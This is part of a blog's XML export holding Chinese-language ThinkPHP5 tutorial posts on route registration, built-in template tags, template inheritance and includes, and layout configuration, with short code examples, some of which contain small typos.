    <content><![CDATA[<h1 id="一丶路由之路由注册"><a href="#一丶路由之路由注册" class="headerlink" title="一丶路由之路由注册"></a><font color=red>一丶路由之路由注册</font></h1><h1 id="路由"><a href="#路由" class="headerlink" title="路由"></a><font color=green size=6>路由</font></h1><p>路由功能由<code>\think\Route</code>类完成。</p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a><font color=green>概述</font></h2><p>由于<code>ThinkPHP5.0默认采用的URL规则是：</code></p>
<p><code>http://server/module/controller/action/param/value/.....</code></p>
<p>路由的作用是简化URL访问地址，并根据定义的路由类型做出正确的解析。</p>
<h2 id="路由模式"><a href="#路由模式" class="headerlink" title="路由模式"></a><font color=green>路由模式</font></h2><p><code>ThinkPHP5.0</code>的路由比较灵活，并且不需要强制定义，可以总结归纳为如下三种方式：</p>
<h3 id="一、普通模式"><a href="#一、普通模式" class="headerlink" title="一、普通模式"></a><font color=green>一、普通模式</font></h3><p>关闭路由，完全使用默认的<code>PATH_INFO</code>方式URL：</p>
<p><code>url_route_on     =&gt;   false,</code></p>
<p>路由关闭后，不会解析任何路由规则，采用默认的<code>PATH_INFO</code>模式访问URL:</p>
<p><code>http://serverName/index.php/module/controller/action/param/value/...</code></p>
<h3 id="二、混合模式"><a href="#二、混合模式" class="headerlink" title="二、混合模式"></a><font color=green>二、混合模式</font></h3><p>开启路由，并使用路由定义+默认<code>PATH_INFO</code>方式的混合:</p>
<p><code>&#39;url_route_on&#39;  =&gt;  true,</code></p>
<p><code>&#39;url_route_must&#39;   =&gt; false,</code></p>
<p>该方式下面，只需要对需要定义路由规则的访问地址定义路由规则，其他的仍然按照第一种普通模式的<code>PATH_INFO</code>模式访问URL。</p>
<h3 id="三、强制模式"><a href="#三、强制模式" class="headerlink" title="三、强制模式"></a><font color=green>三、强制模式</font></h3><p>开启路由，并设置必须定义路由才能访问：</p>
<p><code>url_route_on   =&gt;  true,</code></p>
<p><code>url_route_must   =&gt;   true,</code></p>
<p>这种方式下面必须严格给每一个访问地址定义路由规则（包括首页），否则将抛出异常。</p>
<p>首页的路由规则采用<code>/</code>定义即可，例如下面把网站首页路由输出<code>Hello,world!</code>我们需要在<code>route.php</code>这个文件中配置路由，要使用官方的   <code>use  think\Route</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACTIONSCRIPT"><figure class="iseeu highlight /actionscript"><table><tr><td class="code"><pre><span class="line">Route::<span class="keyword">get</span>(<span class="string">'/'</span>,<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">'Hello,world!'</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>

<h2 id="路由定义"><a href="#路由定义" class="headerlink" title="路由定义"></a><font color=red>路由定义</font></h2><h3 id="注册路由规则"><a href="#注册路由规则" class="headerlink" title="注册路由规则"></a><font color=green>注册路由规则</font></h3><p>路由注册可以采用方法动态单个和批量注册，也可以直接定义路由定义文件的方式进行集中注册。</p>
<h3 id="动态注册"><a href="#动态注册" class="headerlink" title="动态注册"></a><font color=green>动态注册</font></h3><p>路由定义采用<code>\think\Route</code>类的rule方法注册，通常是在应用的路由配置文件</p>
<p><code>application/route.php</code>进行注册，格式是：</p>
<p><code>Route::rule(&#39;路由表达式&#39;，&#39;路由地址&#39;，&#39;请求类型&#39;，&#39;路由参数（数组）&#39;，&#39;变量规则（数组）&#39;)；</code></p>
<p>例如注册如下路由规则：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Route</span>;</span><br><span class="line"><span class="comment">// 注册路由到index模块的Index控制器的list操作</span></span><br><span class="line">Route::rule(<span class="string">'new/:id'</span>,<span class="string">'index/Index/list'</span>);</span><br></pre></td></tr></table></figure></div>

<p>我们访问：</p>
<p><code>http://serverName/new/5</code></p>
<p>会自动路由到：</p>
<p><code>http://serverName/index/index/list/id/5</code></p>
<p>并且原来的访问地址会自动失效。ThinkPHP5.0的路由规则定义是从根目录开始，而不是基于模块名的。</p>
<p>注意，路由命名标识必须唯一，定义后可以用于URL的快速生成。</p>
<p>可以在rule方法中指定请求类型，不指定的话默认为任何请求类型，例如：</p>
<p><code>Route::rule(&#39;new/:id&#39;,&#39;News/update&#39;,&#39;POST&#39;);</code>    表示定义的路由规则在POST请求下才有效。注意：请求类型参数必须大写。</p>
<table>
<thead>
<tr>
<th>请求类型包括：</th>
<th>类型</th>
</tr>
</thead>
<tbody><tr>
<td>GET</td>
<td>GET请求</td>
</tr>
<tr>
<td>POST</td>
<td>POST请求</td>
</tr>
<tr>
<td>PUT</td>
<td>PUT请求</td>
</tr>
<tr>
<td>DELETE</td>
<td>DELETE请求</td>
</tr>
<tr>
<td>*</td>
<td>任何请求类型</td>
</tr>
</tbody></table>
<p>系统提供了为不同的请求类型定义路由规则的简化方法，例如：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">Route::get(<span class="string">'new/:id'</span>,<span class="string">'News/read'</span>); <span class="regexp">//</span> 定义GET请求路由规则</span><br><span class="line">Route::post(<span class="string">'new/:id'</span>,<span class="string">'News/update'</span>); <span class="regexp">//</span> 定义POST请求路由规则</span><br><span class="line">Route::put(<span class="string">'new/:id'</span>,<span class="string">'News/update'</span>); <span class="regexp">//</span> 定义PUT请求路由规则</span><br><span class="line">Route::delete(<span class="string">'new/:id'</span>,<span class="string">'News/delete'</span>); <span class="regexp">//</span> 定义DELETE请求路由规则</span><br><span class="line">Route::any(<span class="string">'new/:id'</span>,<span class="string">'News/read'</span>); <span class="regexp">//</span> 所有请求都支持的路由规则</span><br></pre></td></tr></table></figure></div>

<p>如果要定义get和post请求支持的路由规则，也可以用：</p>
<p><code>Route::rule(&#39;new/:id&#39;,&#39;News/read&#39;,&#39;GET|POST&#39;);</code></p>
<p>我们也可以批量注册路由规则，例如：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SML"><figure class="iseeu highlight /sml"><table><tr><td class="code"><pre><span class="line"><span class="type">Route</span>::rule([<span class="symbol">'new</span>/:id'=&gt;<span class="symbol">'News</span>/read',<span class="symbol">'blog</span>/:name'=&gt;<span class="symbol">'Blog</span>/detail']);</span><br><span class="line"><span class="type">Route</span>::get([<span class="symbol">'new</span>/:id'=&gt;<span class="symbol">'News</span>/read',<span class="symbol">'blog</span>/:name'=&gt;<span class="symbol">'Blog</span>/detail']);</span><br><span class="line"><span class="type">Route</span>::post([<span class="symbol">'new</span>/:id'=&gt;<span class="symbol">'News</span>/update',<span class="symbol">'blog</span>/:name'=&gt;<span class="symbol">'Blog</span>/detail']);</span><br></pre></td></tr></table></figure></div>

<p>注册多个路由规则后，系统会依次遍历注册过的满足请求类型的路由规则，一旦匹配到正确的路由规则后则开始调用控制器的操作方法，后续规则就不再检测。</p>
<h2 id="定义路由配置文件"><a href="#定义路由配置文件" class="headerlink" title="定义路由配置文件"></a><font color=green>定义路由配置文件</font></h2><p>除了支持动态注册，也可以直接在应用目录下面的route.php的最后通过返回数组的方式直接定义路由规则，内容示例如下:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SML"><figure class="iseeu highlight /sml"><table><tr><td class="code"><pre><span class="line">return [</span><br><span class="line">    <span class="symbol">'new</span>/:id' =&gt; <span class="symbol">'News</span>/read',</span><br><span class="line">    <span class="symbol">'blog</span>/:id' =&gt; [<span class="symbol">'Blog</span>/update',[<span class="symbol">'method'</span> =&gt; <span class="symbol">'post</span>|put'], [<span class="symbol">'id'</span> =&gt; <span class="string">'\d+'</span>]],</span><br><span class="line">];</span><br></pre></td></tr></table></figure></div>

<p>路由动态注册和配置定义的方式可以并存。由于检测机制问题，动态注册的性能比路由配置要高一些，尤其是多种请求类型混合定义的时候。</p>
<p>默认情况下，只会加载一个路由配置文件<code>route.php</code>，如果需要定义多个路由文件，可以修改<code>route_config_file</code>的配置参数，例如：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DART"><figure class="iseeu highlight /dart"><table><tr><td class="code"><pre><span class="line">定义路由配置文件（数组）</span><br><span class="line"><span class="string">'route_config_file'</span> =&gt; [<span class="string">'route'</span>, <span class="string">'route1'</span>, <span class="string">'route2'</span>],</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>thinkphp5</category>
      </categories>
      <tags>
        <tag>thinkphp5</tag>
      </tags>
  </entry>
  <entry>
    <title>16.thinkphp5模板之内置标签</title>
    <url>/undefined/16.thinkphp5%E6%A8%A1%E6%9D%BF%E4%B9%8B%E5%86%85%E7%BD%AE%E6%A0%87%E7%AD%BE/</url>
    <content><![CDATA[<h1 id="一丶模板之内置标签"><a href="#一丶模板之内置标签" class="headerlink" title="一丶模板之内置标签"></a><font color=red>一丶模板之内置标签</font></h1><h2 id="1丶内置标签"><a href="#1丶内置标签" class="headerlink" title="1丶内置标签"></a><font color=green>1丶内置标签</font></h2><p>变量输岀使用普通标签就足够了，但是要完成其他的控制、循环和判断功能，就需要借助模板引擎的标签库功能了，系统内置标签库的所有标签无需引入即可直接使用。   </p>
<p>内置标签包括：<br>|标签名|作用|<br>|——|————————-|<br>|include|包含外部模板文件|<br>|load|导入资源文件(闭合包括js css import别名)|<br>|volist|循环数组数据输出|<br>|foreach|数组或对象遍历输出|<br>|for|For循环数据输出|<br>|switch|分支判断输出|<br>|case|分支判断输出(必须个switch配套使用)|<br>|default|默认情况输出(闭合 必须和switch配套使用)|<br>|compare|比较输出(包括eq neq it gt egt elt heq nheq等别名)|<br>|range|判断范围输出(包括 in notin between notbetween别名)|<br>|present|判断是否赋值|<br>|notpresent|判断是否尚未赋值|<br>|empty|判断数据是否为空|<br>|notempty|判断数据是否不为空|<br>|defined|判断常量是否定义|<br>|notdefined|判断常量是否未定义|<br>|define|常量定义|<br>|assign|变量赋值(闭合)|<br>|if|条件判断输出|<br>|elseif|条件判断输出(闭合 必须和if标签配套使用)|<br>|else|条件不成立输出(闭合 可用于其他标签)|<br>|php|使用php代码volist|</p>
<h2 id="2丶循环输出标签"><a href="#2丶循环输出标签" class="headerlink" title="2丶循环输出标签"></a><font color=green>2丶循环输出标签</font></h2><h2 id="VOLIST标签"><a href="#VOLIST标签" class="headerlink" title="VOLIST标签"></a><font color=green>VOLIST标签</font></h2><p>volist标签通常用于查询数据集（ select方法）的结果输出，通常模型的select方法返回的结果是一个二维数组，可以直接使用 alist标签进行输出。在控制器中首先对模板赋值：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="OCAML"><figure class="iseeu highlight /ocaml"><table><tr><td class="code"><pre><span class="line">$<span class="built_in">list</span> = <span class="type">User</span>::all<span class="literal">()</span>;</span><br><span class="line">$<span class="built_in">list</span>-&gt;assign(<span class="symbol">'list</span>,$<span class="built_in">list</span>);</span><br></pre></td></tr></table></figure></div>
<p>在模板定义如下，循环输出姓名的编号和姓名：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XQUERY"><figure class="iseeu highlight /xquery"><table><tr><td class="code"><pre><span class="line">&#123;volist<span class="built_in"> name</span>=<span class="string">"list"</span><span class="built_in"> id</span>=<span class="string">"vo"</span>&#125;</span><br><span class="line">&#123;<span class="variable">$vo</span><span class="built_in">.id</span>&#125;=====&gt;&#123;<span class="variable">$vo</span><span class="built_in">.name</span>&#125;&lt;br/&gt;</span><br><span class="line">&#123;/volist&#125;</span><br></pre></td></tr></table></figure></div>
<p>Volist标签的name属性表示模板赋值的变量名称，因此不可随意在糢板文件中改变。id表示当前的循环变量，可以随意指定，但确保不要和nme属性冲突支持输出查询结果中的部分数据，例如输出其中的第5条~15条记录。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">&#123;volist <span class="built_in">name</span>=<span class="string">"list"</span> <span class="built_in">id</span>=<span class="string">"vo"</span> <span class="built_in">offset</span>=<span class="string">"5"</span> <span class="built_in">length</span>=<span class="string">"10"</span>&#125;</span><br><span class="line">&#123;$vo.<span class="built_in">name</span>&#125;</span><br><span class="line">&#123;/volist&#125;</span><br></pre></td></tr></table></figure></div>
<p><img src="https://i.imgur.com/MttrKTC.png" alt="1"><br><img src="https://i.imgur.com/JTnMxoM.png" alt="1"><br><img src="https://i.imgur.com/8sJTDDv.png" alt="1"><br><img src="https://i.imgur.com/o6Q9aiB.png" alt="1"></p>
<h2 id="FOREACH标签"><a href="#FOREACH标签" class="headerlink" title="FOREACH标签"></a><font color=green>FOREACH标签</font></h2><p>foreach标签类似与volist标签，只是更加简单，没有太多额外的属性，最简单的用法是：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">&#123;<span class="keyword">foreach</span> $list <span class="keyword">as</span> $vo&#125;</span><br><span class="line">	&#123;$vo.id&#125;:&#123;$vo.name&#125;</span><br><span class="line">&#123;/<span class="keyword">foreach</span>&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="FOR标签"><a href="#FOR标签" class="headerlink" title="FOR标签"></a>FOR标签</h2><p>用法：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">&#123;<span class="keyword">for</span> <span class="attribute">start</span>=<span class="string">"开始值"</span>  <span class="attribute">end</span>=<span class="string">"结束值"</span> <span class="attribute">comparison</span>=<span class="string">""</span> <span class="attribute">step</span>=<span class="string">"步进值"</span>  <span class="attribute">name</span>=<span class="string">"循环变量名"</span> &#125;</span><br><span class="line">&#123;/<span class="keyword">for</span>&#125;</span><br></pre></td></tr></table></figure></div>

<p>开始值、结束值、步进值和循环变量都可以支持变量，开始值和结束值是必须的，其他是可选的。comparison的默认值lt,  name的默认值是i ， 步进值的默认值是1，举例如下：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CLOJURE"><figure class="iseeu highlight /clojure"><table><tr><td class="code"><pre><span class="line">&#123;for start=<span class="string">"1"</span>  end=<span class="string">"100"</span>&#125;</span><br><span class="line">&#123;$i&#125;</span><br><span class="line">&#123;/for&#125;</span><br></pre></td></tr></table></figure></div>

<p>解析后的代码是：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=1; <span class="variable">$i</span>&lt;100; <span class="variable">$i</span>+=1) &#123;</span><br><span class="line">  	<span class="built_in">echo</span> <span class="variable">$i</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="标签嵌套"><a href="#标签嵌套" class="headerlink" title="标签嵌套"></a>标签嵌套</h2><p>模板引擎支持标签的多层嵌套功能，可以对标签库的标签指定嵌套。</p>
<p>系统内置的标签中，volist、 switch、if、 elseif、else、foreach、compare（包含所有的比较标签）、（not）present、 （not）empty、 （not）defined等标签都可以嵌套使用。例如：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XQUERY"><figure class="iseeu highlight /xquery"><table><tr><td class="code"><pre><span class="line">&#123;volist<span class="built_in"> name</span>=<span class="string">"list"</span><span class="built_in"> id</span>=<span class="string">"vo"</span>&#125;</span><br><span class="line">    &#123;volist<span class="built_in"> name</span>=<span class="string">"vo['sub']"</span><span class="built_in"> id</span>=<span class="string">"sub"</span>&#125;</span><br><span class="line">   		 &#123;<span class="variable">$sub</span><span class="built_in">.name</span>&#125;</span><br><span class="line">    &#123;/volist&#125;</span><br><span class="line">&#123;/volist&#125;</span><br></pre></td></tr></table></figure></div>

<p>上面的标签可以用于输出双重循环。</p>
<h2 id="原生PHP"><a href="#原生PHP" class="headerlink" title="原生PHP"></a>原生PHP</h2><p>Php代码可以和标签在模板文件中混合使用，可以在模板文件里面书写任意的PHP语句代码，包括下面两种方式：</p>
<h3 id="使用php标签"><a href="#使用php标签" class="headerlink" title="使用php标签"></a>使用php标签</h3><p>例如：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DUST"><figure class="iseeu highlight /dust"><table><tr><td class="code"><pre><span class="line"><span class="template-variable">&#123;php&#125;</span><span class="xml">echo 'Hello  world!';</span><span class="template-tag">&#123;/<span class="name">php</span>&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>我们建议需要使用PHP代码的时候尽量采用php标签，因为原生的PHP语法可能会被配置禁用而导致解析错误。</p>
<h3 id="使用原生php代码"><a href="#使用原生php代码" class="headerlink" title="使用原生php代码"></a>使用原生php代码</h3><p><code>&lt;?php echo &#39;Hello world!&#39;; ?&gt;</code></p>
<p>注意：php标签或者php代码里面就不能再使用标签（包括普通标签和XML标签了），因此下面的几种方式都是无效的。</p>
<p>Php标签里面使用了eq标签，因此无效</p>
<p><code>{php}{eq name=&#39;name&#39;   value=&#39;value&#39;}value{/eq}{/php}</code></p>
<p>Php标签里面使用了<code>{$user}</code>普通标签输出变量，因此无效。</p>
<p><code>{php}if($user.name != &#39;ThinkPHP&#39; ) echo  &#39;ThinkPHP&#39; ;{/php}</code></p>
<p>简而言之，在PHP标签里面不能在使用PHP本身不支持的代码。</p>
]]></content>
      <categories>
        <category>thinkphp5</category>
      </categories>
      <tags>
        <tag>thinkphp5</tag>
      </tags>
  </entry>
  <entry>
    <title>15.thinkphp5模板之模板继承和包含文件</title>
    <url>/undefined/15.thinkphp5%E6%A8%A1%E6%9D%BF%E4%B9%8B%E6%A8%A1%E6%9D%BF%E7%BB%A7%E6%89%BF%E5%92%8C%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<h1 id="一丶模板之模板继承和包含文件"><a href="#一丶模板之模板继承和包含文件" class="headerlink" title="一丶模板之模板继承和包含文件"></a><font color=red>一丶模板之模板继承和包含文件</font></h1><h2 id="1丶模板继承"><a href="#1丶模板继承" class="headerlink" title="1丶模板继承"></a><font color=green>1丶模板继承</font></h2><p>模板继承是一项更加灵活的模板布局方式，模板继承不同于模板布局，甚至来说，应该是在模板布局的上层。模板继承其实并不难理解，就好比类的继承一样，模板也可以定义一个基础模板（或者是布局），并且其中定义的相关的区块（block），然后继承（extend）该基础模块的子模板中就可以对基础模板中定义的区块进行重载。</p>
<p>因此，模板继承的优势其实是设计基础模块中的区块（block）和子模块中替换这些区块。   </p>
<p>每个区块由（b1ock}{/b1ock}标签组成。下面就是基础模板中的一个典型的区块设计。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XL"><figure class="iseeu highlight /xl"><table><tr><td class="code"><pre><span class="line">&#123;<span class="keyword">block</span> <span class="keyword">name</span>=<span class="string">"title"</span>&#125;&lt;<span class="built_in">title</span>&gt;网站标题&lt;/<span class="built_in">title</span>&gt;&#123;/<span class="keyword">block</span>&#125;</span><br></pre></td></tr></table></figure></div>
<p>block标签必零指定name属性来标识当前区块的名称，这个标识在当前模板中应该是唯一的， block标签中可以包含任何模板内容，包括其他标签和变量。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DUST"><figure class="iseeu highlight /dust"><table><tr><td class="code"><pre><span class="line"><span class="template-variable">&#123;block name="title"&#125;</span><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span></span><span class="template-variable">&#123;$web_title&#125;</span><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span></span><span class="template-tag">&#123;/<span class="name">block</span>&#125;</span></span><br></pre></td></tr></table></figure></div>
<p>一个模板中可以定义任意多个名称标识不重复的区块，例如我们在vew视图目录下面定义了一个 base. html基础模板:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DUST"><figure class="iseeu highlight /dust"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">utf-8</span>"&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt; <span class="attr">title</span>&gt;</span>模板继承的演示<span class="tag">&lt;/<span class="name">tit1e</span></span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">    block name="head"&#125;这是头部</span><span class="template-tag">&#123;/ <span class="name">block</span>&#125;</span></span><br><span class="line"><span class="xml">    </span><span class="template-variable">&#123;block name=" footer"&#125;</span><span class="xml">这是底部</span><span class="template-tag">&#123;/ <span class="name">block</span>&#125;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div>
<p>然后我们在子模板（其实是当前操作的入口模板）中使用继承：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XL"><figure class="iseeu highlight /xl"><table><tr><td class="code"><pre><span class="line">&#123;extend <span class="keyword">name</span>=<span class="string">"base"</span>/&#125;</span><br><span class="line">&#123;<span class="keyword">block</span> <span class="keyword">name</span>=<span class="string">"head"</span>&#125;这里是子模板里面的区块，用来替换基础模板里面的内容的&#123;/<span class="keyword">block</span>&#125;</span><br><span class="line">&#123;<span class="keyword">block</span> <span class="keyword">name</span>=<span class="string">" footer&#125;这里是子模板里面的底部内容&lt;/block&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>上例中，我们可以看到在子模板中使用了 extend标签来继承base模板。   </p>
<p>在子模板中，可以对基模板中的区块进行重载定义，如果没有重新定义的话，则表示沿用基础模板中的区块定义，如果定义了一个空的区块，则表示删除基础模板中的该区块内容。   </p>
<p>{_ block_}这个标签，当区块中有这个标记时，就不只是直接重载这个区块，他表示引用所继承模板对应区块的内容到这个位置，最终这个区块是合并后的内容。   </p>
<p>在当前子模板中，只能定义区块而不能定义其他的模板内容，否则将会直接忽略，并且只能定义基础模板中已经定义的区块。   </p>
<p>模板可以多级继承，比如B继承了A而C又继承了B，最终C中的区块会覆盖B和A中的同名区块，但C和B中的区块必须是A中已定义过的。   </p>
<p>子模板中的区块定义顺序是随意的，模板继承的用法关键在于基础模板如何布局和设计规划了，如果结合原来的布局功能，则会更加灵活。</p>
<h2 id="2丶包含文件"><a href="#2丶包含文件" class="headerlink" title="2丶包含文件"></a><font color=green>2丶包含文件</font></h2><p>在当前模板文件中包含其他的模板文件使用 include标签，标签语法   </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GRADLE"><figure class="iseeu highlight /gradle"><table><tr><td class="code"><pre><span class="line">&#123;<span class="keyword">include</span> <span class="keyword">file</span>=<span class="string">'模板文件1，模板文件2，......'</span><span class="regexp">/&#125;</span></span><br></pre></td></tr></table></figure></div>
<p>包含的模板文件中不能再使用模板布局或者模板继承。   </p>
<p>路径以项目目录/public/路径下为起点   </p>
<p>可以直接包含一个模板文件名(包含完整路径),例如：  </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CMAKE"><figure class="iseeu highlight /cmake"><table><tr><td class="code"><pre><span class="line">&#123;<span class="keyword">include</span> <span class="keyword">file</span>=<span class="string">"../application/index（模块名）/view（视图文件夹）/index（控制器）/lang.html（具体模板）"</span>/&#125;</span><br></pre></td></tr></table></figure></div>
<p><img src="https://i.imgur.com/hhMt8F0.png" alt="1"><br><img src="https://i.imgur.com/eprHQT5.png" alt="1"><br>包含文件中可以再使用 include标签包含别的文件，但注意不要形成A包含A，或者A包含B而B又包含A这样的死循环。</p>
]]></content>
      <categories>
        <category>thinkphp5</category>
      </categories>
      <tags>
        <tag>thinkphp5</tag>
      </tags>
  </entry>
  <entry>
    <title>14.thinkphp5模板之模板布局</title>
    <url>/undefined/14.thinkphp5%E6%A8%A1%E6%9D%BF%E4%B9%8B%E6%A8%A1%E6%9D%BF%E5%B8%83%E5%B1%80/</url>
    <content><![CDATA[<h1 id="一丶模板之模板布局"><a href="#一丶模板之模板布局" class="headerlink" title="一丶模板之模板布局"></a><font color=red>一丶模板之模板布局</font></h1><h2 id="1丶全局配置方式"><a href="#1丶全局配置方式" class="headerlink" title="1丶全局配置方式"></a><font color=green>1丶全局配置方式</font></h2><p>这种方式仅需在项目配置文件中添加相关的布局模板配置,就可以简单实现模板布局功能，比较适用于全站使用相同布局的情况,需要配置开启layout_on参数(默认不开启),并且设置布局入口文件名 layout_name(默认为layout).</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCHEME"><figure class="iseeu highlight /scheme"><table><tr><td class="code"><pre><span class="line"><span class="symbol">'template</span><span class="symbol">'=&gt;</span>[</span><br><span class="line">    <span class="symbol">'layout_on</span><span class="symbol">'=&gt;true</span>,</span><br><span class="line">    <span class="symbol">'layout_name</span><span class="symbol">'=&gt;</span><span class="symbol">'layout</span>',</span><br><span class="line">]</span><br></pre></td></tr></table></figure></div>
<p>开启 layout_on后，我们的模板渲染流程就有所变化，例如：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="FORTRAN"><figure class="iseeu highlight /fortran"><table><tr><td class="code"><pre><span class="line">namespace app\<span class="built_in">index</span>\controller； </span><br><span class="line"><span class="keyword">use</span> think\ Controller； </span><br><span class="line"><span class="keyword">Class</span> <span class="built_in">Index</span> <span class="keyword">extends</span> Controller&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span></span> <span class="built_in">index</span>()&#123;</span><br><span class="line">        <span class="keyword">return</span> $this-&gt;fetcho()</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在不开启layout_on布局模板之前，会直接渲染application/ index/view/ index/ index.htm模板文件，开启之后，首先会渲染 application/inex/view/ layout. htm1模板，布局模板的写法和其他模板的写法类似，本身也可以支持所有的模板标签以及包含文件，区别在于有一个特定的输出替换变量（_ <em>CONTENT_</em>}，例如，下面是一个典型的Layout.htm模板的写法</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DUST"><figure class="iseeu highlight /dust"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"width：100%； height：100px； background-color:red； "</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="template-variable">&#123;__CONTENT__&#125;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"width：100%； height：100px； background-color:blue；"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div>
<p>读取layout模板之后，会解析 index/index.html模板文件，并把解析后的内容替换到layout布局模板文件的{CONTENT}特定字符串。   </p>
<p>当然可以通过设置来改变这个特定的替换字符串，例如：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCHEME"><figure class="iseeu highlight /scheme"><table><tr><td class="code"><pre><span class="line"><span class="symbol">'template</span><span class="symbol">'=&gt;</span>[</span><br><span class="line">    <span class="symbol">'layout_on</span><span class="symbol">'=&gt;true</span>,</span><br><span class="line">    <span class="symbol">'layout_name</span><span class="symbol">'=&gt;</span><span class="symbol">'layout</span>',</span><br><span class="line">    <span class="symbol">'layout_time</span><span class="symbol">'=&gt;</span>'&#123;__REPLACE&#125;'</span><br><span class="line">]</span><br></pre></td></tr></table></figure></div>
<p>一个布局模板同时只能有一个特定替换字符串。<br>采用这种布局方式的情况下，一旦 index/ index. htm模板文件或者 layout. htm布局模板文件发生修改，都会导致模板重新编译。<br>如果需要指定其他位置的布局模板，可以使用</p>
